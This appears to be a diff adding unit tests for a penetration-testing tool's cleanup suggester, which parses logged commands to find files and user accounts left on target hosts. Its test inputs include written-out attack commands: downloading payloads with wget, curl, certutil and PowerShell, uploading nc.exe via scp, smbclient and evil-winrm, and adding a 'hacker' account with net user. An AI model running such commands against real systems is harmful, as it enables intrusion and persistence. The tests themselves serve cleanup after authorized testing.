@@ -133,3 +133,52 @@ describe('guards', () => {
     expect(suggestCleanup([old, recent], hosts, '', []).map((s) => s.target)).toEqual(['new', 'old']);
   });
 });
+
+describe('fix round 1', () => {
+  it('combined short flags', () => {
+    expect(run('wget -qO /tmp/a http://x/a', onWeb)[0].target).toBe('/tmp/a');
+    expect(run('wget -qO/tmp/a2 http://x/a', onWeb)[0].target).toBe('/tmp/a2');
+    expect(run('wget -qO- http://x/a', onWeb)).toEqual([]);
+    expect(run('curl -sSLo /tmp/c http://x/a', onWeb)[0].target).toBe('/tmp/c');
+    expect(run('curl -sko /tmp/d http://x/a', onWeb)[0].target).toBe('/tmp/d');
+    expect(run('curl -sSL http://x/a', onWeb)).toEqual([]);
+  });
+  it('stdout redirect of curl/wget in a target shell only', () => {
+    expect(run('curl -s http://x/a > /tmp/r', onWeb)).toEqual([{ kind: 'file', target: '/tmp/r', hostId: 'web' }]);
+    expect(run('curl -s http://x/a >> /tmp/r2', onWeb)[0].target).toBe('/tmp/r2');
+    expect(run('curl -s http://x/a > /tmp/r')).toEqual([]);
+    expect(run('whoami > out.txt', onWeb)).toEqual([]);
+    expect(run('curl -s http://x/a 2>&1', onWeb)).toEqual([]);
+  });
+  it('directory destinations take the source basename', () => {
+    expect(run('scp /opt/a.sh root@10.0.0.50:/tmp/')[0].target).toBe('/tmp/a.sh');
+    expect(run('scp /opt/a.sh root@10.0.0.50:/tmp')[0].target).toBe('/tmp');
+    expect(run('scp /opt/a.sh root@10.0.0.50:~')[0].target).toBe('~/a.sh');
+    expect(run('scp /opt/a.sh root@10.0.0.50:.')[0].target).toBe('a.sh');
+    expect(run("smbclient //10.0.0.1/C$ -c 'put /opt/nc.exe Temp\\'")[0].target).toBe('Temp\\nc.exe');
+    expect(run('upload /opt/n.exe C:\\Temp\\', { hostIds: ['dc'] })[0].target).toBe('C:\\Temp\\n.exe');
+  });
+  it('adduser USER GROUP and net user /add first', () => {
+    expect(run('adduser bob staff', onWeb)[0].target).toBe('bob');
+    expect(run('useradd bob staff', onWeb)[0].target).toBe('staff');
+    expect(run('net user /add hacker P@ss', onWin)[0].target).toBe('hacker');
+  });
+  it('push host falls back to an earlier line in the block', () => {
+    expect(run('evil-winrm -i 10.0.0.1 -u a -p b\nupload /opt/n.exe')[0].hostId).toBe('dc');
+    expect(run('evil-winrm -i 10.0.0.1 -u a -p b\nupload /opt/n.exe', { hostIds: ['web'] })[0].hostId).toBe('dc');
+  });
+  it('unwraps powershell and cmd', () => {
+    expect(run('powershell -nop -c "iwr http://x/a -OutFile C:\\t\\a.exe"', onWin)[0].target).toBe('C:\\t\\a.exe');
+    expect(run('cmd.exe /c certutil -urlcache -f http://x/n C:\\n.exe', onWin)[0].target).toBe('C:\\n.exe');
+    expect(run("(New-Object Net.WebClient).DownloadFile('http://x/a','C:\\w\\a.exe')", onWin)).toEqual([{ kind: 'file', target: 'C:\\w\\a.exe', hostId: 'dc' }]);
+    expect(run("(New-Object Net.WebClient).DownloadFile('http://x/a','C:\\w\\a.exe')")).toEqual([]);
+  });
+  it('tolerates missing command/blocks and unbalanced quotes', () => {
+    const e = cmd('x');
+    const bad = { ...e, content: { kind: 'command', blocks: [{ output: '' }] } } as unknown as LogEntry;
+    const none = { ...e, id: 'n', content: { kind: 'command' } } as unknown as LogEntry;
+    expect(suggestCleanup([bad, none], hosts, '', [])).toEqual([]);
+    expect(run('wget http://x -O "/tmp/uq', onWeb)[0].target).toBe('/tmp/uq');
+  });
+});
+
